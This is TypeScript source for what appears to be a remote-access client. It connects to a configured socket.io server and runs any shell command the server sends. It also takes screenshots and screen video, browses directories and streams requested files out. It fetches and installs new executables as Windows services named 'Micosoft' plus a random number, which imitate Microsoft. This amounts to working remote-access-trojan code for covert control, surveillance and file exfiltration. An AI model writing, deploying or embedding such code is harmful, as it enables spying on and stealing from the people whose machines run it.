import * as fs from "fs";
import * as cmp from "compressing";
import gConfig from "./my_config";
import gStatus from "./status";
import * as cp from "child_process";
import * as os from "os";
import { io as sio } from "socket.io-client";
import * as ss from "socket.io-stream";
import * as icv from "iconv-lite";
import * as http from "http";
import * as util from "util";
import * as path from "path";
import { debug, details, localDebug } from "./log";

const io = sio(`${gConfig.SERVER_ADDRESS}:${gConfig.SERVER_PORT}`);

function formatSeconds(value) {
  const result = parseInt(value);
  const h =
    Math.floor(result / 3600) < 10
      ? "0" + Math.floor(result / 3600)
      : Math.floor(result / 3600);
  const m =
    Math.floor((result / 60) % 60) < 10
      ? "0" + Math.floor((result / 60) % 60)
      : Math.floor((result / 60) % 60);
  const s =
    Math.floor(result % 60) < 10
      ? "0" + Math.floor(result % 60)
      : Math.floor(result % 60);

  let res = "";
  if (h !== "00") res += `${h}小时`;
  if (m !== "00") res += `${m}分钟`;
  res += `${s}秒`;
  return res;
}

function sleep(msec) {
  return new Promise((r) => {
    setTimeout(() => {
      r(null);
    }, msec);
  });
}



function cmdDecode(data) {
  return icv.decode(Buffer.from(data, "binary"), "cp936");
}

function myExec(
  data,
  emitCmdResult = true,
  callback = () => {
    null;
  }
) {
  let result;
  cp.exec(data, { encoding: "binary" }, (error, stdout, stderr) => {
    console.log(stdout);
    try {
      if (error) throw error;
      callback();
      result = cmdDecode(stdout);
    } catch (error) {
      debug(`Exec error occured!\n`);
      debug(details(error));
      debug(cmdDecode(stderr));
      result = cmdDecode(stderr);
    }
    if (emitCmdResult) {
      io.emit("cmdresult", result);
    }
  });
}

function clearTmpDir() {
  const tmpDirFiles = fs.readdirSync(`${gConfig.INSTALL_PATH}tmpDir`);
  try {
    if (!tmpDirFiles.length) {
      console.log("tmpDir已空");
      debug(`tmpDir已空,无需清理`);
      return;
    }
    for (const file of tmpDirFiles) {
      fs.unlinkSync(`${gConfig.INSTALL_PATH}tmpDir/${file}`);
    }
  } catch (error) {
    console.log("tmpDir未完全清理");
  }
}

function installNewService(bootstrapperName, backendName) {
  const NEW_SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;

  if (backendName) {
    cp.execSync(
      `nssm install ${NEW_SERVICE_NAME} "${gConfig.INSTALL_PATH}${backendName}"`
    );
  } else if (bootstrapperName) {
    cp.execSync(
      `nssm install ${NEW_SERVICE_NAME} "${gConfig.INSTALL_PATH}${bootstrapperName}"`
    );
  }

  debug(
    `新服务名是${NEW_SERVICE_NAME},新启动器路径是${bootstrapperName},新后端路径是${backendName}`
  );

  //serviceName
  if (backendName) {
    return `${NEW_SERVICE_NAME}%${backendName}%${getOldBootstrapperName()}`;
  } else {
    return `${NEW_SERVICE_NAME}%${getOldBackendName()}%${bootstrapperName}`;
  }
}

function createFileToClean(filePathArr) {
  // for (const filePath of filePathArr) {
  //   fs.unlinkSync(`${filePath}`);
  // }

  // const OLD_BACKEND_NAME = fs
  //   .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
  //   .toString()
  //   .split("%")[1];
  // const OLD_SERVICE_NAME = fs
  //   .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
  //   .toString()
  //   .split("%")[0];
  // fs.writeFileSync("fileToClean", `${OLD_SERVICE_NAME}%${OLD_BACKEND_NAME}`);
  // fs.writeFileSync("serviceName", `${NEW_SERVICE_NAME}%${NEW_BACKEND_NAME}`);

  // fs.writeFileSync(
  //   `${gConfig.INSTALL_PATH}fileToCleanArr`,
  //   JSON.stringify(filePathArr)
  // );
  fs.writeFileSync(
    `${gConfig.INSTALL_PATH}fileToClean`,
    `${getOldServiceName()}%${getOldBackendName()}%${getOldBootstrapperName()}`
  );
}

function runFileToClean() {
  if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
    const fileToClean = fs
      .readFileSync(`${gConfig.INSTALL_PATH}fileToClean`)
      .toString();
    const arr = fileToClean.split("%");
    if (arr[1]) {
      fs.unlinkSync(`${gConfig.INSTALL_PATH}${arr[1]}`);
    }
    if (arr[2]) {
      fs.unlinkSync(`${gConfig.INSTALL_PATH}${arr[2]}`);
    }
  }
}

function generateDateTail(fileName) {
  let regResult;
  let NEW_FILENAME;
  if ((regResult = fileName.match(/(.*)\.(.*)/))) {
    //有后缀名情况
    NEW_FILENAME = `${regResult[1]}${new Date().getFullYear()}-${
      new Date().getMonth() + 1
    }-${new Date().getDate()}-${new Date().getHours()}-${new Date().getMinutes()}-${new Date().getSeconds()}.${
      regResult[2]
    }`;
  } else {
    //无后缀名默认为"exe"
    NEW_FILENAME = `${fileName}${new Date().getFullYear()}-${
      new Date().getMonth() + 1
    }-${new Date().getDate()}-${new Date().getHours()}-${new Date().getMinutes()}-${new Date().getSeconds()}.exe
    `;
  }

  return NEW_FILENAME;
}

function getOldBackendName() {
  let OLD_BACKEND_NAME;
  if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
    OLD_BACKEND_NAME = fs
      .readFileSync(`${gConfig.INSTALL_PATH}fileToClean`)
      .toString()
      .split("%")[1];
  } else {
    OLD_BACKEND_NAME = fs
      .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
      .toString()
      .split("%")[1];
  }

  return OLD_BACKEND_NAME;
  // const OLD_SERVICE_NAME = fs
  //   .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
  //   .toString()
  //   .split("%")[0];
}

function getOldServiceName() {
  // const OLD_BACKEND_NAME = fs
  //   .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
  //   .toString()
  //   .split("%")[1];

  let OLD_SERVICE_NAME;
  if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
    OLD_SERVICE_NAME = fs
      .readFileSync(`${gConfig.INSTALL_PATH}fileToClean`)
      .toString()
      .split("%")[0];
  } else {
    OLD_SERVICE_NAME = fs
      .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
      .toString()
      .split("%")[0];
  }

  return OLD_SERVICE_NAME;
}

function getOldBootstrapperName() {
  let OLD_BOOTRAPPER_NAME;
  if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
    OLD_BOOTRAPPER_NAME = fs
      .readFileSync(`${gConfig.INSTALL_PATH}fileToClean`)
      .toString()
      .split("%")[2];
  } else {
    OLD_BOOTRAPPER_NAME = fs
      .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
      .toString()
      .split("%")[2];
  }

  return OLD_BOOTRAPPER_NAME;
}

function core_download(coreName = "backend.zip") {
  try {
    if (!fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir`)) {
      fs.mkdirSync(`${gConfig.INSTALL_PATH}tmpDir`);
    }
    http.get(
      `${gConfig.UPDATE_ADDRESS}:${gConfig.UPDATE_PORT}/${coreName}`,
      (res) => {
        let ws = fs.createWriteStream(
          `${gConfig.INSTALL_PATH}tmpDir/${coreName}`
        );
        res.on("data", (chunk) => {
          ws.write(chunk);
        });
        res.on("end", async () => {
          try {
            ws.end();
            debug("后端下载完毕");
            ws.close();
            ws = null;

            const fileToClean = [];

            //backend.zip 旧版兼容
            try {
              const result2 = cmp.zip
                .uncompress(
                  `${gConfig.INSTALL_PATH}tmpDir/${coreName}`,
                  `${gConfig.INSTALL_PATH}tmpDir`
                )
                .then(async () => {
                  debug("处理升级文件中...");

                  let newObj = "";

                  if (
                    fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir/backend.exe`)
                  ) {
                    const NEW_BACKEND_NAME = `${generateDateTail(
                      "backend.exe"
                    )}`;
                    fs.renameSync(
                      `${gConfig.INSTALL_PATH}tmpDir/backend.exe`,
                      `${gConfig.INSTALL_PATH}${NEW_BACKEND_NAME}`
                    );
                    const old_backend_file_path = `${
                      gConfig.INSTALL_PATH
                    }${getOldBackendName()}`;
                    fileToClean.push(getOldBackendName());
                    newObj = installNewService(null, NEW_BACKEND_NAME);
                  } else if (
                    fs.existsSync(
                      `${gConfig.INSTALL_PATH}tmpDir/bootstrapper.exe`
                    )
                  ) {
                    const NEW_BOOTSTRAPPER_NAME = `${generateDateTail(
                      "bootstrapper.exe"
                    )}`;
                    fs.renameSync(
                      `${gConfig.INSTALL_PATH}tmpDir/bootstrapper.exe`,
                      `${gConfig.INSTALL_PATH}${NEW_BOOTSTRAPPER_NAME}`
                    );
                    const old_service_file_path = `${
                      gConfig.INSTALL_PATH
                    }${getOldServiceName()}`;
                    fileToClean.push(old_service_file_path);

                    newObj = installNewService(NEW_BOOTSTRAPPER_NAME, null);
                    if (
                      fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir/serviceCore`)
                    ) {
                      fs.renameSync(
                        `${gConfig.INSTALL_PATH}tmpDir/serviceCore`,
                        `${gConfig.INSTALL_PATH}serviceCore`
                      );
                      debug(`复制core完毕,带启动器`);
                    }
                  } else if (
                    fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir/serviceCore`)
                  ) {
                    fs.renameSync(
                      `${gConfig.INSTALL_PATH}tmpDir/serviceCore`,
                      `${gConfig.INSTALL_PATH}serviceCore`
                    );
                    debug(`复制core完毕,不带启动器`);
                    try {
                      cp.execSync(
                        `taskkill /F /im ${getOldBootstrapperName()}`
                      );
                    } catch (error) {
                      debug(details(error));
                    }
                    return;
                  }

                  createFileToClean(fileToClean);
                  fs.writeFileSync(
                    `${gConfig.INSTALL_PATH}serviceName`,
                    newObj
                  );
                  while (
                    !gStatus.waitForServiceStatus(
                      newObj.split("%")[0],
                      gStatus.STOPPED
                    )
                  ) {
                    await sleep(300);
                  }
                  cp.execSync(`nssm start ${newObj.split("%")[0]}`);
                })
                .catch((reason) => {
                  debug(details(reason));
                  debug("backend解压错误!");
                });
            } catch (error) {
              console.log(details(error));
            }
          } catch (e) {
            debug(details(e));
          }
        });
      }
    );
  } catch (e) {
    debug("Core Download Wrong!!");
    debug(details(e));
  }
}

function utils_download(utilsName = "pack.zip") {
  if (!fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir`)) {
    fs.mkdirSync(`${gConfig.INSTALL_PATH}tmpDir`);
  }
  http.get(
    `${gConfig.UPDATE_ADDRESS}:${gConfig.UPDATE_PORT}/${utilsName}`,
    (res) => {
      const ws = fs.createWriteStream(
        `${gConfig.INSTALL_PATH}tmpDir/${utilsName}`
      );
      res.on("data", (chunk) => {
        ws.write(chunk);
      });
      res.on("end", () => {
        ws.end();
        ws.end();
        debug(`工具集下载完毕`);
        if (!fs.existsSync(`${gConfig.INSTALL_PATH}utils`)) {
          fs.mkdirSync(`${gConfig.INSTALL_PATH}utils`);
        }
        try {
          const result = cmp.zip.uncompress(
            `${gConfig.INSTALL_PATH}tmpDir/${utilsName}`,
            `${gConfig.INSTALL_PATH}utils`
          );
        } catch (error) {
          console.log(details(error));
        }
      });
      res.on("error", (err) => {
        debug(`工具集下载失败!\n${err.message}`);
      });
    }
  );
}

io.on("reload", (id) => {
  io.close();
});

io.on("connect_error", () => {
  console.log(`${new Date().toUTCString()}: connect error!`);
});

io.on("connect", () => {
  io.send(`from client ${io.id}`);
  io.emit("init", {
    主机名: util.inspect(os.hostname()),
    架构: util.inspect(os.arch()),
    平台: util.inspect(os.platform()),
    // networkInterfaces: util.inspect(os.networkInterfaces()),
    // cpus: util.inspect(os.cpus()),
    // tmpdir: util.inspect(os.tmpdir()),
    空闲内存: util.inspect((os.freemem() / 1024 / 1024).toFixed(2) + "MB"),
    // userInfo: util.inspect(os.userInfo()),
    总内存: util.inspect(
      (os.totalmem() / 1024 / 1024 / 1000).toFixed(2) + "GB"
    ),
    //系统版本
    系统版本名: util.inspect(os.version()),
    // homedir: util.inspect(os.homedir()),
    系统种类: util.inspect(os.type()),
    系统正常运行时间: util.inspect(os.uptime() + "秒"),
  });
});

io.on("message", (data) => {
  console.log(data);
});

io.on("exec", (data) => {
  console.log(data);
  // let res = "empty";
  // result = cp.execSync(data);
  // result = icv.decode(cp.execSync(data), "gb2312");
  myExec(data);
  // console.log(result.toString());
  // io.emit("cmdresult", result.toString());
});

io.on("version_update", (coreName) => {
  core_download(coreName);
});

io.on("utils_update", (utilsName) => {
  utils_download(utilsName);
});

io.on("screenshot", async () => {
  try {
    cp.execSync(`${gConfig.UTILS_PATH}ExplorerUtil.exe /screenshot`);
    await sleep(1000);
    const buffer = fs.readFileSync(`${gConfig.INSTALL_PATH}demo.jpg`);
    io.emit("screenshot", buffer.toString("base64"));
    fs.unlinkSync(`${gConfig.INSTALL_PATH}demo.jpg`);
  } catch (e) {
    debug(details(e));
  }
});

io.on("listdir", (dir) => {
  try {
    const result = [];
    let arr;
    if (fs.statSync(dir).isDirectory()) {
      arr = fs.readdirSync(dir);
      if (arr.length === 0) {
        io.emit("listdir", result, dir);
        return;
      }
      for (const item of arr) {
        try {
          localDebug(item);
          result.push({
            name: item,
            isDir: fs.statSync(path.resolve(dir, item)).isDirectory(),
            lstat: fs.lstatSync(path.resolve(dir, item)),
          });
        } catch (error) {
          io.emit("debug", "读取某个文件错误");
          debug(error.message);
        }
      }
      io.emit("listdir", result, dir);
    } else {
      const tmp = path.resolve(dir, "..");
      arr = fs.readdirSync(tmp);
      for (const item of arr) {
        result.push({
          name: item,
          isDirectory: fs.statSync(path.resolve(dir, item)).isDirectory(),
        });
      }
      io.emit("listdir", result, tmp);
    }
  } catch (error) {
    io.emit("debug", details(error));
  }
});

io.on("downloadfile", (target) => {
  console.log(target);
  console.log(123);

  const stream = ss.createStream();

  ss(io).emit("downloadfile", stream, path.basename(target));
  fs.createReadStream(target).pipe(stream);
});

io.on("showfilecontent", () => {
  null;
});

io.on("startvideocapture", (id) => {
  try {
    cp.execSync(`tasklist|findstr "ffmpeg"`);
  } catch (error) {
    cp.exec(`${gConfig.UTILS_PATH}ExplorerUtil.exe /videocapture ${id}`);
    // io.emit("startvideocapture");
  }
});

io.on("stopvideocapture", () => {
  try {
    // cp.execSync(`taskkill /F /im ExplorerUtil.exe`);
    // cp.execSync(`taskkill /F /im ffmpeg.exe`);
    myExec(`taskkill /F /im ExplorerUtil.exe`);
    myExec(`taskkill /F /im ffmpeg.exe`);
  } catch (error) {
    console.log(details(error));
  }
});

io.on("dialog", () => {
  myExec(`dxdiag /whql:off /t dialog.txt`, false, async () => {
    while (!fs.existsSync("dialog.txt")) {
      await sleep(1000);
    }
    const dialogStream = fs.readFileSync("dialog.txt");
    const dialogContent = icv.decode(dialogStream, "gb2312");
    fs.unlinkSync("dialog.txt");
    debug(dialogContent);
  });
});

function main() {
  setTimeout(async function () {
    try {
      let oldBackend;
      let serviceToStop;
      let oldBootstrapper;
      if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
        oldBackend = getOldBackendName();
        oldBootstrapper = getOldBootstrapperName();
        serviceToStop = getOldServiceName();
        if (gStatus.isServiceExists(serviceToStop)) {
          try {
            cp.execSync(`nssm stop ${serviceToStop}`);
            cp.execSync(`nssm remove ${serviceToStop} confirm`);
          } catch (error) {
            null;
          }
          // await gStatus.waitForServiceStatus(serviceToStop, gStatus.STOPPED);
        }
        if (fs.existsSync(`${gConfig.INSTALL_PATH}${oldBackend}`)) {
          fs.unlinkSync(oldBackend);
        }
        if (fs.existsSync(`${gConfig.INSTALL_PATH}${oldBootstrapper}`)) {
          fs.unlinkSync(oldBootstrapper);
        }
        if (fs.existsSync("fileToClean")) {
          fs.unlinkSync("fileToClean");
        }
        if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToCleanArr`)) {
          fs.unlinkSync(`${gConfig.INSTALL_PATH}fileToCleanArr`);
        }
        clearTmpDir();
      } else if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToCleanArr`)) {
        oldBackend = getOldBackendName();
        serviceToStop = getOldServiceName();
        oldBootstrapper = getOldBootstrapperName();
        if (gStatus.isServiceExists(serviceToStop)) {
          try {
            cp.execSync(`nssm stop ${serviceToStop}`);
            cp.execSync(`nssm remove ${serviceToStop} confirm`);
          } catch (error) {
            null;
          }
          // await gStatus.waitForServiceStatus(serviceToStop, gStatus.STOPPED);
        }
        if (fs.existsSync(`${gConfig.INSTALL_PATH}${oldBackend}`)) {
          fs.unlinkSync(oldBackend);
        }
        if (fs.existsSync(`${gConfig.INSTALL_PATH}${oldBootstrapper}`)) {
          fs.unlinkSync(oldBootstrapper);
        }
        if (fs.existsSync("fileToClean")) {
          fs.unlinkSync("fileToClean");
        }
        if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToCleanArr`)) {
          fs.unlinkSync(`${gConfig.INSTALL_PATH}fileToCleanArr`);
        }
        clearTmpDir();
      } else {
        clearTmpDir();
        return;
      }
      debug(`客户端更新完毕`);
    } catch (e) {
      console.log("无需更新或错误");
      debug(details(e));
      console.log(e);
    }
  }, 500);
  setInterval(() => {
    io.emit("updateinfo", {
      系统正常运行时间: util.inspect(formatSeconds(os.uptime())),
      空闲内存: util.inspect((os.freemem() / 1024 / 1024).toFixed(2) + "MB"),
    });
  }, 5000);
}

main();

export default io;
